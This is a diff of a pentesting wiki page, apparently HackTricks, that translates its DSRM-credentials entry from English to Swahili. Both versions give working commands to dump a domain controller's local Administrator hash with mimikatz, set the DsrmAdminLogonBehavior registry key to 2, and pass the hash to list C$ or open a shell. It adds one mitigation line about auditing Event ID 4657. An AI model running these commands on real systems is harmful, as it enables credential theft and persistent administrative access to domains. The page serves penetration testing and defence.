@@ -2,34 +2,27 @@
 
 # DSRM Credentials
 
-There is a **local administrator** account inside each **DC**. Having admin privileges in this machine you can use mimikatz to **dump the local Administrator hash**. Then, modifying a registry to **activate this password** so you can remotely access to this local Administrator user.\
-First we need to **dump** the **hash** of the **local Administrator** user inside the DC:
-
+Kuna akaunti ya **meneja wa ndani** ndani ya kila **DC**. Ukiwa na haki za admin katika mashine hii unaweza kutumia mimikatz **kutoa hash ya Meneja wa ndani**. Kisha, kubadilisha rejista ili **kuamsha nenosiri hili** ili uweze kufikia kwa mbali mtumiaji huyu wa Meneja wa ndani.\
+Kwanza tunahitaji **kutoa** **hash** ya mtumiaji wa **Meneja wa ndani** ndani ya DC:
 ```bash
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 ```
-
-Then we need to check if that account will work, and if the registry key has the value "0" or it doesn't exist you need to **set it to "2"**:
-
+Kisha tunahitaji kuangalia kama akaunti hiyo itafanya kazi, na ikiwa ufunguo wa rejista una thamani "0" au haupo unahitaji **kuweka kuwa "2"**:
 ```bash
 Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
 New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
 Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
 ```
-
-Then, using a PTH you can **list the content of C$ or even obtain a shell**. Notice that for creating a new powershell session with that hash in memory (for the PTH) **the "domain" used is just the name of the DC machine:**
-
+Kisha, ukitumia PTH unaweza **kuorodhesha maudhui ya C$ au hata kupata shell**. Kumbuka kwamba kwa kuunda kikao kipya cha powershell na hash hiyo kwenye kumbukumbu (kwa PTH) **"domain" inayotumika ni jina tu la mashine ya DC:**
 ```bash
 sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
 #And in new spawned powershell you now can access via NTLM the content of C$
 ls \\dc-host-name\C$
 ```
+Zaidi ya habari kuhusu hii katika: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) na [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)
 
-More info about this in: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) and [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)
+## Kupunguza
 
-## Mitigation
-
-- Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`
+- Kitambulisho cha Tukio 4657 - Ukaguzi wa uundaji/mabadiliko ya `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`
 
 {{#include ../../banners/hacktricks-training.md}}
-
